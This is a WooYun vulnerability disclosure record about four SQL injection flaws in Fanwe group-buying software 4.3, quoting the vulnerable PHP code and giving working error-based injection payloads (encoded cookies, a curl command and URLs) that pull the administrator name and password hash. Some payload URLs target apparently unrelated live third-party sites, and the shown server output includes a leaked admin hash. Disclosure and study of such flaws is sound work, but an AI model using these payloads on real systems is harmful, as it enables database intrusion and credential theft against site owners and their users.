{"id": 41733, "wybug_id": "wooyun-2014-087824", "wybug_title": "方维团购最新版本4个sql注射打包", "wybug_corp": "fanwe.com", "wybug_author": "loopx9", "wybug_date": "2014-12-23 18:59", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 测试最新版本4.3. 详细说明：  注入点1: app\\source\\user_init.php:\n...//开始自动登录 by hcif($_SESSION['user_id'] == 0 && isset($_COOKIE['email']) && isset($_COOKIE['password'])) //cookie传入{\t$cookie_user['email'] = trim(unserialize(base64_decode($_COOKIE['email']))); //没有过滤，base64编码，不受GPC限制\t$cookie_user['user_pwd'] = trim(unserialize(base64_decode($_COOKIE['password'])));\t\t$userinfo = $GLOBALS['db']->getRow(\"SELECT `id`,`user_name`,`user_pwd`,`status`,`group_id`,`city_id`,`parent_id` FROM \".DB_PREFIX.\"user WHERE email='\".$cookie_user['email'].\"' and user_pwd='\".$cookie_user['user_pwd'].\"'\");\t//进入查询\t...\n注入点2: app\\source\\goods_list.php:\n...if ($_REQUEST ['m'] == 'Goods' && $_REQUEST ['a'] == 'showByUname') {    $uname = addslashes($_REQUEST['uname']);    if($uname!='')    {    \t$uname = rawurldecode($uname); //addslashes 和rawurldecode 顺序反了，url编码可绕过addslashes，不受GPC限制\t\t$sql =\"select id from \".DB_PREFIX.\"goods where u_name='\".$uname.\"'\";  //拼接参数\t\t$goods_id =intval($GLOBALS['db']->getOneCached($sql));   //进入查询    }\t}\t...\n注入点3: app\\source\\index_malllist.php:\n...    if ($_REQUEST ['m'] == 'Index' && $_REQUEST ['a'] == 'unSubScribe') {    \t//退订\t\t$email = trim(urldecode($_REQUEST['email'])); //同前一个注入，url编码bypass GPC\t\t$sql = \"delete from \" . DB_PREFIX . \"mail_address_list where mail_address = '{$email}'\"; //拼接语句\t\tif ($GLOBALS ['db']->query ( $sql )) {  //进入查询\t\t\tsuccess(a_L ( \"SUBSCRIBEBACK_SUCCESS\" ),'',a_u(\"Index/index\"));\t\t} else {\t\t\ta_error(a_L ( \"SUBSCRIBEBACK_FAILED\" ),'',a_u(\"Index/index\"));\t\t}\t\texit;\t\t}    ...\n注入点4: mapi\\fanwe.php:\nerror_reporting(E_ALL ^ E_NOTICE); $i_type = 0;//上传数据格式类型; 0:base64;1;REQUEST;2:json//r_type: 返回数据格式类型; 0:base64;1;json_encode;2:arrayif (isset($_REQUEST['i_type'])){\t$i_type = intval($_REQUEST['i_type']);}if ($i_type == 1){\t$requestData = $_REQUEST;}else{\tif (isset($_REQUEST['requestData'])){\t\tif ($i_type == 2){\t\t\t$requestData = json_decode(trim($_REQUEST['requestData']), 1);\t\t\t\t}else{\t\t\t$requestData = base64_decode(trim($_REQUEST['requestData']));  //base64解码\t\t\t$requestData = json_decode($requestData, 1);  //json解码，跟进$requestData\t\t}\t}else{\t\t$requestData = $_REQUEST;\t}}    ...\t\t\t\t\t\t\t$keyword = trim($requestData['keyword']); //$keyword没有过滤\t\tif ($keyword && $keyword <> ''){\t\t\t$sql .= \" and (g.name_1 like '%$keyword%' )\";\t //参数拼接\t\t\t$sql_count .= \" and (g.name_1 like '%$keyword%' )\";\t\t\t\t\t}\t\t\t\t\t\t\t$sql .= \" group by g.id order by g.sort desc,g.id desc\";\t\t$sql_count .= \" order by g.sort desc,g.id desc\";\t\t$sql.=\" limit \".$limit;\t\t$list = $GLOBALS['db']->getAll($sql); //进入查询\t\t$total = $GLOBALS['db']->getOne($sql_count);    ...\n   漏洞证明：  官方演示站点测试: http://t1.fanwe.net:93/t1/ admin表: t1_admin注入点1: 序列化payload，然后再base64编码:\ns:191:\"'AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT SUBSTRING(CONCAT(adm_name,0x7c,adm_pwd,0x7c),1,60) FROM t1_admin LIMIT 0,1),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a)#\";\n\n编辑cookie添加email和password然后访问/index.phpemail=czoxOTE6IidBTkQgKFNFTEVDVCAxIEZST00oU0VMRUNUIENPVU5UKCopLENPTkNBVCgoU0VMRUNUIFNVQlNUUklORyhDT05DQVQoYWRtX25hbWUsMHg3YyxhZG1fcHdkLDB4N2MpLDEsNjApIEZST00gdDFfYWRtaW4gTElNSVQgMCwxKSxGTE9PUihSQU5EKDApKjIpKVggRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIEdST1VQIEJZIFgpYSkjIjs=; password=0;\n\ncurl -b \"email=czoxOTE6IidBTkQgKFNFTEVDVCAxIEZST00oU0VMRUNUIENPVU5UKCopLENPTkNBVCgoU0VMRUNUIFNVQlNUUklORyhDT05DQVQoYWRtX25hbWUsMHg3YyxhZG1fcHdkLDB4N2MpLDEsNjApIEZST00gdDFfYWRtaW4gTElNSVQgMCwxKSxGTE9PUihSQU5EKDApKjIpKVggRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIEdST1VQIEJZIFgpYSkjIjs=; password=0;\" http://t1.fanwe.net:93/t1/<b>MySQL server error report:Array(    [0] => Array        (            [message] => MySQL Query Error        )    [1] => Array        (            [sql] => SELECT `id`,`user_name`,`user_pwd`,`status`,`group_id`,`city_id`,`parent_id` FROM t1_user WHERE email=''AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT SUBSTRING(CONCAT(adm_name,0x7c,adm_pwd,0x7c),1,60) FROM t1_admin LIMIT 0,1),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a)#' and user_pwd=''        )    [2] => Array        (            [error] => Duplicate entry 'fanwe|6714ccb93be0fda4e51f206b91b46358|1' for key 'group_key'        )    [3] => Array        (            [errno] => 1062        ))\n\n\nhttp://www.tl19tuan.com/\n\n注入点2:\nhttp://t1.fanwe.net:93/t1/index.php?m=Goods&a=showByUname&uname=%2527%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20SUBSTRING(CONCAT(adm_name,0x7c,adm_pwd,0x7c),1,60)%20FROM%20t1_admin%20LIMIT%200,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%23\n\n\n注入点3:\nhttp://t1.fanwe.net:93/t1/index.php?m=Index&a=unSubScribe&email=%2527%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20SUBSTRING(CONCAT(adm_name,0x7c,adm_pwd,0x7c),1,60)%20FROM%20t1_admin%20LIMIT%200,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%23\n\n\n注入点4: payload json_encode再base64编码:\nhttp://t1.fanwe.net:93/t1/mapi/index.php?requestData=eyJrZXl3b3JkIjoiJykgQU5EIChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoKFNFTEVDVCBTVUJTVFJJTkcoQ09OQ0FUKGFkbV9uYW1lLDB4N2MsYWRtX3B3ZCwweDdjKSwxLDYwKSBGUk9NIHQxX2FkbWluIExJTUlUIDAsMSksRkxPT1IoUkFORCgwKSoyKSlYIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBHUk9VUCBCWSBYKWEpIyIsImFjdCI6Im5lYXJieWdvb2RzZXMifQ==\n\n\n\nhttp://www.tl19tuan.com/mapi/index.php?requestData=eyJrZXl3b3JkIjoiJykgQU5EIChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoKFNFTEVDVCBTVUJTVFJJTkcoQ09OQ0FUKHVzZXIoKSwweDdjLHZlcnNpb24oKSwweDdjKSwxLDYwKSksRkxPT1IoUkFORCgwKSoyKSlYIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBHUk9VUCBCWSBYKWEpIyIsImFjdCI6Im5lYXJieWdvb2RzZXMifQ==\n\n\n\nhttp://www.pt916.com/mapi/index.php?requestData=eyJrZXl3b3JkIjoiJykgQU5EIChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoKFNFTEVDVCBTVUJTVFJJTkcoQ09OQ0FUKHVzZXIoKSwweDdjLHZlcnNpb24oKSwweDdjKSwxLDYwKSksRkxPT1IoUkFORCgwKSoyKSlYIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBHUk9VUCBCWSBYKWEpIyIsImFjdCI6Im5lYXJieWdvb2RzZXMifQ==\n\n\n   修复方案：  过滤.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-03 12:43 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  膜拜之    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}